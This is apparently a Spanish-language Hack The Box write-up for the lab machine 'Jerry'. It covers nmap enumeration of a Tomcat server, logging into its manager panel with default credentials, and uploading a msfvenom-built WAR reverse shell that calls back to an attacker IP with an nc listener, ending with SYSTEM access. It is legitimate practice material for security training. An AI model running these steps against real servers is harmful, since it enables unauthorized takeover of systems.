---
layout: post
title: HTB_Jerry
date: 2023/07/10
slug: HTB_Jerry
heroImage: /assets/machines.jpg
---

# Jerry {-}

## Introduccion {-}

La maquina del dia se llama Jerry.

El replay del live se puede ver aqui

[![S4vitaar Sauna maquina](https://img.youtube.com/vi/GFED7XNYmXI/0.jpg)](https://www.youtube.com/watch?v=GFED7XNYmXI)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.95
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.95
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.95 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p8080 10.10.10.95 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 8080   | http     | Web Fuzzing        |            |


### Analyzando la web {-}


#### Http Enum {-}

```bash
nmap --script http-enub -p8080 10.10.10.95 -oN webScan
```



## Vulnerability Assessment {-}

#### Checkear la web {-}

Vemos la pagina por defecto de Tomcat. Vamos en la url 
```bash
 http://10.10.10.95:8080/manager/html 
```
, Intentamos credenciales por defecto:

- admin:admin
- tomcat:tomcat
- tomcat:s3cret

Ya hemos ganado acceso al panel de manager.
## Vuln exploit & Gaining Access {-}

### War malicioso para tomcat {-}

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f war -o shell.war
```

Nos ponemos en escucha por el puerto 443

```bash
rlwrap nc -nlvp 443
```

Subimos el war a la web de manager y ya ganamos accesso a la maquina victima. A demas ya estamos como 
```bash
 nt authority\system 
```

